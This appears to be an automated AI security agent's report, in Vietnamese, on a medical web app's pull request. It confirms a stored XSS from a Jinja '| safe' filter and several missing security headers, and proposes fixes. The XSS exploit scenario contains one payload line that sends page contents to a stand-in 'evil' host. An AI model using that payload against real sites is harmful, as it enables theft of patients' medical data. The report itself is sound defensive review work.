<!-- secagent-report -->
## 🛡️ AI Security Agent

**Kết quả:** 10 lỗi thật (TP) · 0 cần người xem (NEEDS_REVIEW) · 0 báo nhầm (FP) · trong đó 0 phát hiện mới do Agent tự tìm · commit `b6844e9`

| | Mức | Nguồn | Phát hiện | Vị trí | Độ tin cậy |
|---|---|---|---|---|---|
| 🔴 TP | HIGH | semgrep | security.semgrep.medicare.jinja-safe-filter (semgrep) | `app/medicare/templates/record/detail.html:29` | 0.97 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /login:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:GET /login:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments/{appointment_id}/confirm:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients/{patient_id}/edit:0` | 0.80 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /:0` | 0.80 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /health:0` | 0.80 |

### Chi tiết

#### 🔴 TP · HIGH · security.semgrep.medicare.jinja-safe-filter (semgrep) — `app/medicare/templates/record/detail.html:29`

CWE-79 · OWASP A05 · độ tin cậy 0.97 · nguồn: semgrep

**Phân tích:** `note.body | safe` render HTML do người dùng nhập mà không lọc. `add_note` trong service.py chỉ strip và kiểm tra độ dài, không sanitize. Server không có allowlist thẻ nào, client có thể POST trực tiếp `<script>` hoặc `<img onerror>` vào `body`. Không có CSP nên XSS lưu trữ chạy được trong phiên của bệnh nhân, y tá hoặc bác sĩ khác khi họ mở bệnh án.

**Kịch bản khai thác:** Bác sĩ phụ trách (hoặc kẻ chiếm tài khoản bác sĩ) gửi POST /records/{id}/notes với body `<img src=x onerror=fetch('//evil/?c='+document.body.innerText)>`. Khi bệnh nhân hoặc bác sĩ khác xem phiếu khám, script chạy trong phiên của họ, đánh cắp dữ liệu y tế hoặc thực hiện thao tác thay họ.

**Đề xuất sửa:** Trong record/service.py `add_note`, sanitize `body` phía server bằng allowlist (ví dụ nh3 hoặc bleach, chỉ cho p, b, i, u, ul, li, br và không cho attribute); nên sanitize cả khi hiển thị. Hoặc bỏ `| safe` trong detail.html và lưu văn bản thuần để Jinja tự escape. Thêm header CSP để giảm thiểu.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Tìm toàn repo không thấy X-Frame-Options hay frame-ancestors, nên ứng dụng không chống clickjacking.

**Đề xuất sửa:** Thêm middleware đặt header bảo mật cho mọi response: `X-Frame-Options: DENY` hoặc CSP `frame-ancestors 'none'`.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /login:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Trang /login không có header chống clickjacking vì repo không đặt X-Frame-Options hay frame-ancestors.

**Đề xuất sửa:** Dùng middleware chung đặt `X-Frame-Options: DENY` và CSP `frame-ancestors 'none'`.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:GET /login:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Không có `X-Content-Type-Options` / nosniff trong repo.

Gộp các phát hiện: `zap:10021:dast:GET /login:0`, `zap:10038:dast:GET /login:0`

**Đề xuất sửa:** Thêm middleware đặt `X-Content-Type-Options: nosniff` cho mọi response.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Repo không đặt Content-Security-Policy. CSP là lớp giảm thiểu quan trọng vì PR này thêm XSS lưu trữ (F1).

**Đề xuất sửa:** Thêm CSP qua middleware chung, ví dụ `default-src 'self'; script-src 'self'; frame-ancestors 'none'`.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments/{appointment_id}/confirm:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Repo không đặt Content-Security-Policy ở response nào.

**Đề xuất sửa:** Thêm CSP qua middleware chung cho mọi response.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Repo không đặt Content-Security-Policy ở response nào.

**Đề xuất sửa:** Thêm CSP qua middleware chung cho mọi response.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients/{patient_id}/edit:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Repo không đặt Content-Security-Policy ở response nào.

**Đề xuất sửa:** Thêm CSP qua middleware chung cho mọi response.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Không có `X-Content-Type-Options` / nosniff trong repo.

**Đề xuất sửa:** Thêm middleware đặt `X-Content-Type-Options: nosniff` cho mọi response.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /health:0`

CWE-693 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Không có `X-Content-Type-Options` / nosniff trong repo, kể cả ở /health.

**Đề xuất sửa:** Thêm middleware đặt `X-Content-Type-Options: nosniff` cho mọi response.

---
<sub>LLM `claude-mcp` · model `claude-sonnet-5-5` · chiến lược `agent` · 52.4 s · 25 lần gọi LLM · 14 lần gọi công cụ · 113222 token vào / 8391 token ra · ≈ $0.1904 · chạm giới hạn: không</sub>
